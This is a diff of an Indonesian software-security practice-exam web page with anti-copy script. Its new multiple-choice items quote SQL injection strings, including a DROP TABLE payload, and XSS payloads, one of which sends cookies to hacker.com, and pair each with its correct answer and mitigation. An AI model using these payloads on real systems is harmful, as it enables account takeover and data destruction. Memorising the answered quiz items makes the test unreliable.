@@ -12,16 +12,15 @@
             padding: 0;
             width: 100%;
             height: 100%;
-            background-color: #f8fafc; /* slate-50 */
-            color: #0f172a; /* slate-900 */
+            background-color: #f8fafc;
+            color: #0f172a;
             font-family: 'Inter', system-ui, -apple-system, sans-serif;
             
-            /* Prevent Text Selection & Copy */
-            -webkit-user-select: none; /* Safari */
-            -moz-user-select: none; /* Firefox */
-            -ms-user-select: none; /* IE10+/Edge */
-            user-select: none; /* Standard */
-            -webkit-touch-callout: none; /* iOS Safari */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
         }
         
         ::-webkit-scrollbar { width: 8px; }
@@ -49,14 +48,9 @@
             top: 0;
             z-index: 10;
         }
-        .timer-warning {
-            color: #ef4444;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
+        .timer-warning { color: #ef4444; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
         .option-btn {
             display: flex;
             width: 100%;
@@ -69,64 +63,26 @@
             border-radius: 0.5rem;
             cursor: pointer;
             transition: all 0.2s ease;
-            position: relative;
             align-items: flex-start;
         }
-        .option-btn:hover:not(:disabled) {
-            background-color: #f8fafc;
-            border-color: #94a3b8;
-        }
-        .option-btn.selected {
-            background-color: #eff6ff; /* indigo-50 */
-            border-color: #6366f1; /* indigo-500 */
-            box-shadow: 0 0 0 1px #6366f1;
-        }
-        .option-btn.correct {
-            background-color: #f0fdf4; /* green-50 */
-            border-color: #22c55e; /* green-500 */
-            color: #166534;
-        }
-        .option-btn.wrong {
-            background-color: #fef2f2; /* red-50 */
-            border-color: #ef4444; /* red-500 */
-            color: #991b1b;
-        }
+        .option-btn:hover:not(:disabled) { background-color: #f8fafc; border-color: #94a3b8; }
+        .option-btn.selected { background-color: #eff6ff; border-color: #6366f1; box-shadow: 0 0 0 1px #6366f1; }
+        .option-btn.correct { background-color: #f0fdf4; border-color: #22c55e; color: #166534; }
+        .option-btn.wrong { background-color: #fef2f2; border-color: #ef4444; color: #991b1b; }
+        
         .btn-primary {
-            background-color: #2563eb;
-            color: white;
-            font-weight: 600;
-            padding: 0.75rem 1.5rem;
-            border-radius: 0.5rem;
-            transition: background-color 0.2s;
+            background-color: #2563eb; color: white; font-weight: 600;
+            padding: 0.75rem 1.5rem; border-radius: 0.5rem; transition: background-color 0.2s;
         }
-        .btn-primary:hover:not(:disabled) {
-            background-color: #1d4ed8;
-        }
-        .btn-primary:disabled {
-            background-color: #e2e8f0;
-            color: #94a3b8;
-            cursor: not-allowed;
-        }
-        .option-letter {
-            font-weight: 700;
-            min-width: 24px;
-            color: inherit;
-        }
-        .explanation-divider {
-            border-top: 1px solid currentColor;
-            opacity: 0.2;
-            margin: 0.75rem 0;
-        }
-        .keyboard-hint {
-            display: inline-block;
-            padding: 2px 6px;
-            background: #e2e8f0;
-            border-radius: 4px;
-            font-size: 0.75rem;
-            margin-left: 8px;
-            color: #475569;
-            border: 1px solid #cbd5e1;
-        }
+        .btn-primary:hover:not(:disabled) { background-color: #1d4ed8; }
+        .btn-primary:disabled { background-color: #e2e8f0; color: #94a3b8; cursor: not-allowed; }
+        
+        .option-letter { font-weight: 700; min-width: 24px; color: inherit; }
+        .explanation-divider { border-top: 1px solid currentColor; opacity: 0.2; margin: 0.75rem 0; }
+        .keyboard-hint { display: inline-block; padding: 2px 6px; background: #e2e8f0; border-radius: 4px; font-size: 0.75rem; margin-left: 8px; color: #475569; border: 1px solid #cbd5e1; }
+        
+        /* Format font monospace untuk payload agar lebih mudah dibaca */
+        code { background-color: #f1f5f9; padding: 2px 4px; border-radius: 4px; font-family: monospace; color: #be123c; }
     </style>
 </head>
 <body>
@@ -141,17 +97,17 @@
                     <span class="text-slate-500 font-semibold text-sm tracking-wider uppercase">Portal Latihan Akademik Tertutup</span>
                 </div>
                 
-                <h1 class="text-3xl font-bold text-slate-800 mb-2">Latihan Soal Simulasi UTS</h1>
+                <h1 class="text-3xl font-bold text-slate-800 mb-2">Simulasi UTS: Analisis Kasus & Payload</h1>
                 <h2 class="text-xl text-blue-600 font-medium mb-1">Mata Kuliah: Keamanan Perangkat Lunak</h2>
-                <h3 class="text-md text-slate-500 font-medium mb-6">Semester VI | Mode: Anti-Cheat & Pembahasan Logis</h3>
+                <h3 class="text-md text-slate-500 font-medium mb-6">Semester VI | Bobot: 3 SKS</h3>
                 
                 <div class="space-y-4 text-slate-700 mb-8 bg-slate-50 p-6 rounded-lg border border-slate-200 text-sm">
-                    <p><strong>Deskripsi & Regulasi Simulasi:</strong></p>
+                    <p><strong>Regulasi & Fokus Simulasi:</strong></p>
                     <ul class="list-disc pl-5 space-y-2 mt-2">
-                        <li><strong>150 Bank Soal Analitis:</strong> Sistem memastikan 3x Sesi pertama Anda (50 soal/sesi) <strong>100% unik tanpa soal berulang</strong>.</li>
-                        <li><strong>Durasi:</strong> 60 Menit per sesi.</li>
-                        <li><strong>Anti-Cheat Aktif:</strong> Fungsi Copy-Paste, Blok Teks, dan Klik Kanan telah dinonaktifkan.</li>
-                        <li><strong>Keyboard Shortcuts <span class="keyboard-hint">A-E</span> <span class="keyboard-hint">Enter</span> :</strong> Gunakan huruf <strong>A, B, C, D, E</strong> di keyboard untuk memilih jawaban, dan <strong>Enter</strong> untuk mengonfirmasi/melanjutkan soal.</li>
+                        <li><strong>Bank Soal (150 Unik):</strong> 100% difokuskan pada materi PDF (SDLC vs Secure SDLC, CIA, STRIDE, 5 Secure Coding Rules, Tooling SAST/DAST).</li>
+                        <li><strong>Fokus Evaluasi:</strong> Analisis kode (pseudocode), identifikasi <code>payload</code> (SQLi, XSS, Cmd Injection), dan pemetaan STRIDE pada studi kasus.</li>
+                        <li><strong>Anti-Cheat Aktif:</strong> Fungsi Copy-Paste & Klik Kanan dinonaktifkan.</li>
+                        <li><strong>Keyboard Shortcuts <span class="keyboard-hint">A-E</span> <span class="keyboard-hint">Enter</span>:</strong> Gunakan keyboard untuk mempercepat navigasi.</li>
                     </ul>
                 </div>
                 
@@ -163,7 +119,7 @@
         <div id="screen-exam" class="hidden flex-1 flex flex-col">
             <header class="header-panel">
                 <div>
-                    <div class="text-xs text-slate-500 font-semibold mb-1 uppercase tracking-wider">Latihan Soal Simulasi UTS</div>
+                    <div class="text-xs text-slate-500 font-semibold mb-1 uppercase tracking-wider">Simulasi UTS Analitik</div>
                     <div class="font-bold text-slate-800">Keamanan Perangkat Lunak <span class="text-xs font-normal text-slate-500 ml-2">(Sesi <span id="active-session-text">1</span>/3)</span></div>
                 </div>
                 <div class="text-right">
@@ -182,18 +138,9 @@
                 </div>
 
                 <div class="mb-6 flex-1">
-                    <h3 id="question-text" class="text-lg md:text-xl font-medium text-slate-800 mb-6 leading-relaxed">
-                        <!-- Soal masuk sini -->
-                    </h3>
-
-                    <div id="options-container" class="space-y-3">
-                        <!-- Opsi masuk sini -->
-                    </div>
-
-                    <!-- KOTAK PEMBAHASAN / KOREKSI -->
-                    <div id="explanation-box" class="hidden mt-6 p-4 rounded-lg">
-                        <!-- Pembahasan masuk sini -->
-                    </div>
+                    <h3 id="question-text" class="text-lg md:text-xl font-medium text-slate-800 mb-6 leading-relaxed"></h3>
+                    <div id="options-container" class="space-y-3"></div>
+                    <div id="explanation-box" class="hidden mt-6 p-4 rounded-lg"></div>
                 </div>
 
                 <div class="flex justify-between pt-4 border-t border-slate-200 mt-auto items-center">
@@ -209,8 +156,8 @@
         <!-- SCREEN 3: HASIL EVALUASI -->
         <div id="screen-result" class="hidden flex-1 flex flex-col justify-center p-6 bg-slate-50">
             <div class="bg-white border border-slate-200 rounded-xl p-8 w-full shadow-lg text-center">
-                <h1 class="text-3xl font-bold text-slate-800 mb-2">Hasil Latihan Simulasi</h1>
-                <p class="text-slate-500 mb-8">Evaluasi kesiapan UTS Keamanan Perangkat Lunak</p>
+                <h1 class="text-3xl font-bold text-slate-800 mb-2">Transkrip Evaluasi Analisis</h1>
+                <p class="text-slate-500 mb-8">Pemetaan Kesiapan UTS Keamanan Perangkat Lunak</p>
                 
                 <div class="grid grid-cols-2 gap-4 mb-8">
                     <div class="bg-slate-50 border border-slate-200 p-6 rounded-xl">
@@ -238,36 +185,30 @@
 
     <script>
         // ANTI CHEATING JAVASCRIPT
-        document.addEventListener('contextmenu', event => event.preventDefault()); // No Right Click
-        document.addEventListener('copy', event => { event.preventDefault(); return false; }); // No Copy
-        document.addEventListener('cut', event => { event.preventDefault(); return false; }); // No Cut
-        document.addEventListener('paste', event => { event.preventDefault(); return false; }); // No Paste
+        document.addEventListener('contextmenu', event => event.preventDefault()); 
+        document.addEventListener('copy', event => { event.preventDefault(); return false; }); 
+        document.addEventListener('cut', event => { event.preventDefault(); return false; }); 
+        document.addEventListener('paste', event => { event.preventDefault(); return false; }); 
         document.addEventListener('keydown', function(e) {
-            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
             if(e.keyCode == 123) { e.preventDefault(); return false; }
             if(e.ctrlKey && e.shiftKey && e.keyCode == 73) { e.preventDefault(); return false; }
             if(e.ctrlKey && e.shiftKey && e.keyCode == 74) { e.preventDefault(); return false; }
             if(e.ctrlKey && e.keyCode == 85) { e.preventDefault(); return false; }
         });
 
-        // GENERATOR & DATABASE 150 SOAL EKSKLUSIF (Semester 6)
+        // GENERATOR DISTRACTOR UNTUK 150 SOAL EKSKLUSIF (Fokus Kasus & Payload)
         const generateDistractors = (qText, correct, wrong1, wrong2, explanation) => {
             const genericDistractors = [
-                "Mengganti framework frontend ke React/Vue",
-                "Memasang Antivirus di server database",
-                "Menambahkan komentar HTML di source code",
-                "Menggunakan metodologi Agile Waterfall",
-                "Melakukan instalasi ulang sistem operasi Server",
-                "Meningkatkan kapasitas RAM & CPU server",
-                "Membeli lisensi software keamanan berbayar",
-                "Memblokir semua IP address dari luar negeri",
-                "Menghapus database secara berkala tiap malam",
-                "Menggunakan HTTP sebagai standar komunikasi intranet",
-                "Menonaktifkan seluruh fitur Javascript di sisi Client",
-                "Mengubah password database menjadi lebih panjang",
-                "Menerapkan konsep Security by Obscurity murni",
-                "Mendelegasikan otentikasi kepada tim Marketing",
-                "Memindahkan server fisik ke ruangan bawah tanah"
+                "Melanggar aturan penamaan variabel di backend",
+                "Memicu serangan Phishing melalui email",
+                "Membuat algoritma enkripsi berjalan lebih lambat",
+                "Mengharuskan penggunaan metode Agile Scrum",
+                "Memicu vulnerability Network DDoS tingkat ISP",
+                "Merupakan contoh pengujian fungsionalitas UI",
+                "Solusinya adalah memperbesar kapasitas database",
+                "Hanya bisa dideteksi oleh Software Composition Analysis (SCA)",
+                "Masuk dalam kategori cacat hardware server",
+                "Solusinya adalah mengenkripsi koneksi dengan TLS 1.3"
             ];
             for (let i = genericDistractors.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
@@ -283,174 +224,87 @@
             };
         };
 
+        // DATABASE 150 SOAL (STRICT PDF ALIGNMENT: PAYLOADS, CASES, CODE ANALYSIS)
         const rawQuestions = [
-            // --- TOPIC 1 & 2: SDLC vs Secure SDLC & Konsep Dasar (20 Soal) ---
-            ["Fokus utama pada SDLC Konvensional adalah Fungsionalitas. Apa fokus dari Secure SDLC?", "Fungsionalitas + Keamanan", "Hanya Kecepatan Rilis", "Desain Antarmuka UI/UX", "Secure SDLC mengintegrasikan keamanan sebagai syarat fungsionalitas itu sendiri, bukan sekadar fitur tambahan."],
-            ["Kapan timing injeksi praktik keamanan pada SDLC Konvensional?", "Akhir (fase testing / pre-release)", "Awal (fase requirements)", "Tengah (fase coding)", "Pada pendekatan lama, keamanan baru dites setelah aplikasi hampir jadi (fase testing). Ini berisiko tinggi."],
-            ["Kapan timing injeksi praktik keamanan pada Secure SDLC?", "Sejak awal (requirements & design)", "Saat akan rilis (deployment)", "Setelah ada laporan eksploitasi", "Secure SDLC menganut prinsip Shift-Left, diterapkan sejak fase paling awal hingga rilis."],
-            ["Pendekatan keamanan pada Secure SDLC bersifat Proaktif. Apa sifat pada SDLC Konvensional?", "Reaktif (Menambal setelah jadi)", "Preventif (Mencegah dengan AI)", "Eksploratif", "SDLC Konvensional bersifat reaktif karena developer baru bereaksi setelah bug ditemukan."],
-            ["Mengapa prinsip 'Fix early, fix cheap' sangat penting dalam Secure SDLC?", "Perbaikan di tahap desain jauh lebih murah dibanding saat produksi", "Mencegah perlunya melakukan Penetration Testing", "Developer tidak dibayar di fase awal", "Menemukan celah di fase desain biayanya 1x, jika di produksi bisa melonjak hingga 100x lipat."],
-            ["Konsep memindahkan pengujian keamanan seawal mungkin ke kiri di diagram SDLC dikenal dengan istilah?", "Shift-Left Security", "Shift-Right Testing", "Post-Release Patching", "Shift-Left Security menarik tahap pengujian keamanan ke fase awal pipeline CI/CD."],
-            ["Dalam fase Requirements, selain mendefinisikan Use Case yang sah, analis keamanan harus membuat?", "Abuse Cases / Misuse Cases", "Script Load Testing", "Diagram Database Entity", "Abuse Case mendeskripsikan bagaimana sistem bisa disalahgunakan oleh attacker."],
-            ["Apa tujuan utama dari pembuatan Abuse Cases?", "Mengidentifikasi bagaimana attacker memanipulasi fitur sistem", "Menghukum developer yang kodenya error", "Mempercepat proses load database", "Dengan memahami pola serangan, arsitek bisa menetapkan Security Requirements sejak dini."],
-            ["Jika keamanan hanya ditambahkan di akhir sebagai 'tambalan', pendekatan ini sering disebut?", "Bolt-on Security", "Built-in Security", "Defense in Depth", "Bolt-on Security mengibaratkan keamanan seperti gembok yang dipasang belakangan (lemah)."],
-            ["Kegagalan mengadopsi Secure SDLC sering berujung pada tingginya 'Technical Debt'. Apa itu?", "Tumpukan kerentanan yang dibiarkan dan semakin mahal diperbaiki", "Hutang biaya server AWS bulanan", "Kode yang terlalu panjang", "Technical Debt keamanan berarti mengambil jalan pintas coding yang mewariskan kerentanan."],
-            ["Dalam DevSecOps, keamanan bukan lagi sekadar tugas Security Engineer, melainkan tanggung jawab?", "Shared Responsibility seluruh tim (Dev, Sec, Ops)", "Manajer Proyek", "Pihak ketiga (Auditor)", "Model DevSecOps menekankan budaya tanggung jawab bersama."],
-            ["Aktivitas utama di fase Design dalam Secure SDLC yang menelaah kelemahan struktural adalah?", "Architectural Risk Analysis (ARA) & Threat Modeling", "Menulis Unit Test", "Deploy ke Staging", "ARA dan Threat Modeling bertujuan mencari celah desain sebelum kode ditulis."],
-            ["Apa perbedaan fundamental antara Security Requirement dan Functional Requirement?", "Security Req mensyaratkan bagaimana sistem melindungi dirinya", "Security Req selalu lebih mahal", "Functional Req tidak perlu diuji", "Functional mengatur fitur (misal: login), Security mengatur perlindungan (misal: login harus di-rate-limit)."],
-            ["Praktik mereview dependensi atau library pihak ketiga masuk ke dalam kontrol keamanan?", "Software Composition Analysis (SCA)", "SAST", "Penetration Testing", "SCA digunakan khusus melacak dan mendeteksi kelemahan pada library/open-source yang dipakai."],
-            ["Tantangan utama saat mengubah budaya tim dari Agile biasa ke DevSecOps adalah?", "Resistensi tim yang menganggap sekuriti menghambat rilis cepat", "Kurangnya spesifikasi RAM", "Tidak adanya tools gratis", "Kultur atau mindset adalah penghambat utama, karena developer biasa dituntut bekerja secepat mungkin."],
-            ["Manakah aktivitas yang TIDAK TEPAT dilakukan di fase Requirements?", "Melakukan konfigurasi WAF di production", "Mendefinisikan Abuse Cases", "Membuat Matriks Kepatuhan Regulasi", "Konfigurasi WAF di production adalah tugas di fase Deployment/Operations, bukan Requirements."],
-            ["Apa arti dari adagium 'You cannot bolt on security'?", "Keamanan harus di-desain (built-in) dari awal, bukan ditambahkan di akhir", "Keamanan itu mitos", "Patching tidak berguna", "Keamanan yang hanya ditempel (bolt-on) tidak akan pernah menutupi celah logika arsitektural."],
-            ["Dalam konteks risiko, apa bedanya Bug dan Flaw?", "Bug adalah error implementasi (koding), Flaw adalah error desain/arsitektur", "Bug itu kecil, Flaw itu besar", "Bug di frontend, Flaw di backend", "Bug (misal XSS) mudah dicek SAST, Flaw (misal IDOR) sering lolos karena butuh analisa logika desain."],
-            ["Berdasarkan statistik industri, fase mana yang paling banyak melahirkan 'Flaw' keamanan?", "Design & Architecture", "Testing", "Deployment", "Mayoritas kelemahan struktural (Flaw) lahir dari kesalahan rancang bangun di fase desain."],
-            ["Metodologi SDLC apa yang sangat rentan menumpuk Security Debt jika tidak dimodifikasi?", "Agile Konvensional (yang hanya mengejar velocity sprint)", "Waterfall", "DevSecOps", "Agile murni yang terobsesi pada rilis cepat tiap sprint sering mengabaikan testing keamanan."],
+            // --- KASUS: SQL INJECTION (PAYLOAD & KODE) ---
+            ["Studi Kasus: Log server menangkap input form login dengan nilai <code>' OR 1=1 --</code>. Apa ancaman spesifik yang sedang dieksekusi?", "SQL Injection (Authentication Bypass)", "Cross-Site Scripting (Reflected)", "Command Injection", "Payload tersebut menggunakan operator logika OR untuk memaksa statemen WHERE menjadi 'True', sehingga attacker bisa login tanpa password."],
+            ["Studi Kasus: Kode backend ditulis seperti ini: <code>query = \"SELECT * FROM users WHERE user = '\" + input + \"'\"</code>. Apa celah utamanya?", "Vulnerable thd SQLi akibat String Concatenation", "Vulnerable thd XSS akibat kurang Output Encoding", "Aman jika input diproses menggunakan MD5", "Penggabungan string (concatenation) memasukkan payload langsung ke mesin database tanpa filter, memicu SQL Injection."],
+            ["Studi Kasus: Untuk mengatasi SQLi, tim menerapkan Regex untuk mem-block kata <code>SELECT</code> dan <code>DROP</code>. Kenapa ini cacat logis?", "Blacklisting sangat lemah; attacker bisa mem-bypass dengan encoding atau variasi syntax (misal: SeLeCt)", "Membebani CPU server secara berlebihan", "Regex tidak bisa dijalankan di bahasa Python", "Blacklisting adalah anti-pattern. Mitigasi absolut SQLi adalah Parameterized Query."],
+            ["Studi Kasus: Kode aman ditulis: <code>cursor.execute(\"SELECT * FROM data WHERE id = ?\", (user_id,))</code>. Mengapa ini kebal SQLi?", "Database engine memisahkan struktur query dari payload data", "Data dienkripsi sebelum masuk database", "Karakter kutip otomatis dihapus (Sanitized)", "Parameterized Query mengirimkan data secara terpisah. DB engine akan memperlakukan input murni sebagai 'nilai', bukan perintah SQL yang bisa dieksekusi."],
+            ["Studi Kasus: Attacker menginput <code>'; DROP TABLE users; --</code>. Jika lolos, elemen CIA mana yang hancur total?", "Availability (Ketersediaan data)", "Confidentiality (Kerahasiaan)", "Non-Repudiation (Nir-Syangkal)", "DROP TABLE menghapus seluruh data tabel. Jika data lenyap, sistem kehilangan aspek Ketersediaan (Availability)."],
 
-            // --- TOPIC 3 & 4: CIA Triad, Basic Principles & Risk (25 Soal) ---
-            ["Enkripsi dan Hashing digunakan untuk menjamin aspek CIA apa?", "Confidentiality (Kerahasiaan)", "Integrity (Integritas)", "Availability (Ketersediaan)", "Kriptografi memastikan data tidak dapat dibaca oleh pihak tanpa otorisasi (Confidentiality)."],
-            ["Digital Signature dan Checksum bertujuan untuk mendeteksi perubahan data. Ini menjamin aspek?", "Integrity", "Confidentiality", "Availability", "Integritas memastikan data tidak dimanipulasi. Checksum memvalidasi file 100% sama dengan asli."],
-            ["Penggunaan Load Balancer dan Anti-DDoS bertujuan untuk melindungi aspek?", "Availability", "Integrity", "Confidentiality", "Availability memastikan layanan tetap bisa diakses pengguna saat dibutuhkan."],
-            ["Prinsip membatasi hak akses entitas hanya ke sumber daya yang mutlak diperlukan disebut?", "Least Privilege", "Defense in Depth", "Fail Secure", "Least Privilege mencegah eksploitasi yang meluas jika satu akun diretas."],
-            ["Menerapkan WAF, DB Encryption, dan MFA secara bersamaan adalah implementasi konsep?", "Defense in Depth (Keamanan Berlapis)", "Separation of Duties", "Security by Obscurity", "Defense in Depth berasumsi satu lapisan bisa ditembus, sehingga dipasang banyak lapisan penahan."],
-            ["Jika sistem error/crash, default state-nya harus menolak akses. Ini prinsip?", "Fail Secure / Fail Safe", "Open Design", "Availability", "Dalam Fail Secure, jika otentikasi rusak, program harus otomatis memblokir akses."],
-            ["Rumus fundamental analisis risiko keamanan adalah Risk = ...", "Dampak (Impact) x Kemungkinan (Probability)", "Vulnerability x Asset", "Threat x Exploit", "Risiko diukur dari besarnya kerusakan (Impact) dikalikan mudahnya celah dieksploitasi (Probability)."],
-            ["Dalam terminologi keamanan, 'kelemahan dalam sistem yang bisa dieksploitasi' disebut?", "Vulnerability", "Threat", "Asset", "Vulnerability adalah cacat logika atau celah dalam kode."],
-            ["Aktor, entitas, atau kejadian yang memiliki potensi untuk mengeksploitasi sistem disebut?", "Threat (Ancaman)", "Vulnerability (Celah)", "Risk (Risiko)", "Threat berasal dari luar, misalnya Hacker yang memanfaatkan Vulnerability."],
-            ["Prinsip 'Separation of Duties' bertujuan untuk mencegah fraud dengan cara?", "Membagi tugas krusial agar tidak dieksekusi 1 orang saja", "Memisahkan server database dan web server", "Memisahkan logic frontend dan backend", "Sistem 'Maker dan Checker' meminimalisir penyalahgunaan wewenang."],
-            ["Mengapa 'Security through Obscurity' tidak direkomendasikan?", "Jika rahasia metode terbongkar, sistem langsung tidak berdaya", "Sangat mahal untuk diimplementasikan", "Melanggar hukum privasi", "Hanya mengandalkan kerahasiaan metode tanpa otentikasi solid sangat rapuh."],
-            ["Prinsip Keep It Simple (Simplicity) sangat penting dalam arsitektur karena?", "Sistem yang kompleks memperbesar Attack Surface", "Developer kurang pintar", "Menghemat biaya AWS", "Semakin banyak kode dan fitur, semakin banyak pintu masuk (Attack Surface) bagi peretas."],
-            ["Aspek Non-Repudiation (Nir-Syangkal) bertujuan agar entitas tidak bisa membantah tindakannya. Ini dicapai via?", "Audit Logs dan Digital Signatures", "Enkripsi Simetris", "WAF", "Log yang tak bisa diubah menjadi bukti forensik digital valid."],
-            ["Jika terjadi kebocoran data pelanggan, denda dari otoritas (seperti GDPR) termasuk dalam kategori dampak?", "Legal & Regulatory Impact", "Technical Impact", "Operational Impact", "Kerugian denda masuk dalam hitungan bisnis/hukum (Legal Impact) dari persamaan Risiko."],
-            ["Memberikan izin 'Read-Only' pada staff magang, dan bukan 'Read-Write', adalah aplikasi dari prinsip?", "Least Privilege", "Separation of Duties", "Open Design", "Memberikan hak seminimal mungkin sesuai kebutuhan tugas."],
-            ["Serangan Ransomware mengunci file server. Ini jelas menyerang elemen CIA bagian?", "Availability", "Confidentiality", "Integrity", "Ransomware membuat data tidak tersedia (Unavailable) bagi pemilik sahnya."],
-            ["Prinsip 'Economy of Mechanism' (Desain yang Ekonomis) serupa dengan prinsip?", "Keep It Simple / Simplicity", "Defense in Depth", "Security by Obscurity", "Prinsip klasik Saltzer & Schroeder yang menegaskan desain harus sesederhana mungkin untuk diuji."],
-            ["Apa fungsi utama dari 'Asset Inventory' dalam manajemen risiko?", "Mengetahui apa saja yang harus dilindungi dan berapa nilainya", "Menghukum admin jaringan", "Membeli lisensi baru", "Lu tidak bisa melindungi sesuatu yang lu tidak tahu eksistensinya (You can't protect what you don't know)."],
-            ["Kebocoran private key sertifikat SSL berimbas hancurnya jaminan dari aspek?", "Confidentiality & Integrity dalam transmisi", "Availability", "Authorization", "Private key yang bocor membuat attacker bisa menyadap (hilang kerahasiaan) dan mengubah (hilang integritas) data MITM."],
-            ["Konsep bahwa desain keamanan harus terbuka dan bukan rahasia (Kecuali kuncinya) disebut?", "Kerckhoffs's Principle / Open Design", "Security by Obscurity", "Fail Secure", "Desain kriptografi harus diekspos agar diuji publik, yang rahasia hanyalah key-nya."],
-            ["Pemberian hak akses 'root' ke aplikasi web database secara default melanggar prinsip?", "Least Privilege", "Fail Safe", "Defense in Depth", "Aplikasi web seharusnya pakai akun DB terbatas, bukan root, agar eksploitasi SQLi tidak merembet ke level OS."],
-            ["Memiliki 3 vendor firewall yang berbeda merek di lapis jaringan adalah aplikasi prinsip?", "Defense in Depth", "Separation of Duties", "Fail Secure", "Keragaman vendor (Vendor Diversity) adalah strategi Defense in Depth melawan zero-day spesifik pabrikan."],
-            ["Penerapan CAPTCHA pada halaman login utamanya bertujuan untuk memitigasi hilangnya aspek?", "Availability (mencegah DoS / Brute-force)", "Confidentiality", "Integrity", "CAPTCHA mencegah bot menguras resource server atau menebak password massal."],
-            ["Kelemahan pada 'People, Process, Technology'. Phishing menyerang pada bagian?", "People (Manusia)", "Technology", "Process", "Manusia sering disebut sebagai mata rantai terlemah dalam keamanan informasi."],
-            ["Metode perhitungan risiko yang menggunakan metrik angka pasti (misal Dolar $) disebut?", "Quantitative Risk Analysis", "Qualitative Risk Analysis", "Threat Modeling", "Pendekatan kuantitatif memakai angka riil, kualitatif memakai matriks (Tinggi/Sedang/Rendah)."],
+            // --- KASUS: CROSS-SITE SCRIPTING (XSS) ---
+            ["Studi Kasus: Attacker mensubmit komentar dengan isi <code>&lt;script&gt;document.location='http://hacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code>. Ini adalah serangan?", "Cross-Site Scripting (Stored XSS)", "Insecure Deserialization", "Server-Side Request Forgery", "Script tersebut tersimpan di database (Stored) dan akan tereksekusi di browser korban lain untuk mencuri Session Cookie mereka."],
+            ["Studi Kasus: Bagaimana cara mitigasi level koding yang paling presisi untuk mencegah eksploitasi payload <code>&lt;img src=x onerror=alert(1)&gt;</code> saat dirender di UI?", "Output Encoding (Context-Aware Escaping)", "Menerapkan Parameterized Query di database", "Mem-block karakter <code>&lt;</code> dan <code>&gt;</code>", "Output Encoding mengubah karakter berbahaya menjadi entity aman (misal <code>&lt;</code> menjadi <code>&amp;lt;</code>) sehingga browser merendernya sebagai teks mati, bukan kode yang tereksekusi."],
+            ["Studi Kasus: Payload XSS berhasil mencuri <code>document.cookie</code> korban. Flag pengaman apa yang dilupakan developer pada konfigurasi cookie?", "HttpOnly", "Secure", "SameSite", "Flag 'HttpOnly' mencegah API sisi klien (seperti JavaScript) untuk membaca nilai cookie tersebut, mematikan 99% dampak pencurian cookie via XSS."],
 
-            // --- TOPIC 5: STRIDE & Threat Modeling (25 Soal) ---
-            ["STRIDE adalah Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, dan?", "Elevation of Privilege", "Execution of Payload", "Evasion of Proxy", "Elemen terakhir adalah Elevation of Privilege, yaitu ancaman memanipulasi hak akses."],
-            ["Serangan Session Hijacking masuk dalam ancaman?", "Spoofing", "Repudiation", "Tampering", "Spoofing berkaitan dengan otentikasi. Mencuri session = menyamar sebagai user sah."],
-            ["Mengubah parameter harga pada saat checkout di e-commerce termasuk pelanggaran?", "Tampering", "Spoofing", "Denial of Service", "Tampering adalah tindakan memanipulasi atau mengubah data yang sedang diproses."],
-            ["Serangan SQL Injection mengubah struktur query aslinya. Ini ancaman utama pada aspek?", "Tampering", "Information Disclosure", "Repudiation", "Mekanis SQL Injection adalah manipulasi (Tampering) terhadap perintah database."],
-            ["Bocornya data sensitif pasien di rumah sakit akibat API terbuka masuk ancaman?", "Information Disclosure", "Denial of Service", "Tampering", "Information Disclosure merusak aspek Kerahasiaan (Confidentiality)."],
-            ["Seorang attacker mengirim jutaan paket untuk menghabiskan resource server. Ini masuk dalam?", "Denial of Service (DoS)", "Elevation of Privilege", "Spoofing", "DoS bertujuan membuat server crash sehingga layanan tidak tersedia."],
-            ["User biasa mengedit parameter API dan menjadi Admin. Ini ancaman?", "Elevation of Privilege", "Information Disclosure", "Tampering", "Ini Vertical Privilege Escalation, meningkatkan wewenang melampaui batas sistem."],
-            ["Menghapus log aplikasi agar jejak intrusi tidak terdeteksi memfasilitasi ancaman?", "Repudiation", "Spoofing", "Denial of Service", "Repudiation adalah ketika seseorang bisa menyangkal telah melakukan tindakan jahat."],
-            ["Diagram apa yang mutlak digunakan sebagai dasar visual untuk analisis STRIDE?", "Data Flow Diagram (DFD)", "Use Case Diagram", "Flowchart Logika", "DFD menunjukkan aliran data dan batas jaringan (Trust Boundary) yang esensial untuk Threat Modeling."],
-            ["Garis konseptual yang memisahkan area kurang aman ke area aman di DFD disebut?", "Trust Boundary", "Data Store", "External Interactor", "Saat data melewati Trust Boundary, data MUTLAK harus divalidasi."],
-            ["Serangan Man-in-the-Middle (MitM) utamanya melanggar elemen STRIDE?", "Information Disclosure & Tampering", "Repudiation & Denial of Service", "Elevation of Privilege", "Attacker bisa membaca data (Disclosure) dan mengubah isinya (Tampering)."],
-            ["Mitigasi paling mutlak untuk mengatasi ancaman 'Repudiation' adalah?", "Audit logging yang terproteksi (Tamper-proof)", "Enkripsi database AES-256", "Load Balancer", "Log aktivitas ketat menjadi bukti digital tak terbantahkan."],
-            ["Insecure Direct Object Reference (IDOR) membaca data orang lain masuk ancaman?", "Information Disclosure", "Tampering", "Spoofing", "IDOR menyebabkan sistem membocorkan informasi privat."],
-            ["Entitas eksternal dalam DFD (misal: User atau API pihak ketiga) disimbolkan dengan bentuk?", "Kotak persegi panjang (Rectangle)", "Lingkaran", "Garis putus-putus", "Sesuai standar DFD konvensional untuk external interactor."],
-            ["Mitigasi untuk ancaman 'Elevation of Privilege' adalah?", "Authorization checks / Pengecekan otorisasi ketat di backend", "Penggunaan HTTPS", "Hashing password", "Sistem harus memverifikasi role/izin tiap kali aksi sensitif diminta."],
-            ["Bagaimana cara merespons ancaman Spoofing menurut metode mitigasi STRIDE?", "Implementasi Strong Authentication (MFA, TLS)", "Penggunaan Parameterized Query", "Pembatasan rate limit", "Autentikasi kuat membuktikan identitas pengguna tidak mudah disalin."],
-            ["Threat Modeling paling ideal dan efisien dilakukan pada tahap?", "Design / Architecture Phase", "Setelah aplikasi rilis", "Di tengah proses koding", "Threat Modeling dilakukan di papan tulis/diagram sebelum kode ditulis untuk mencegah flaw."],
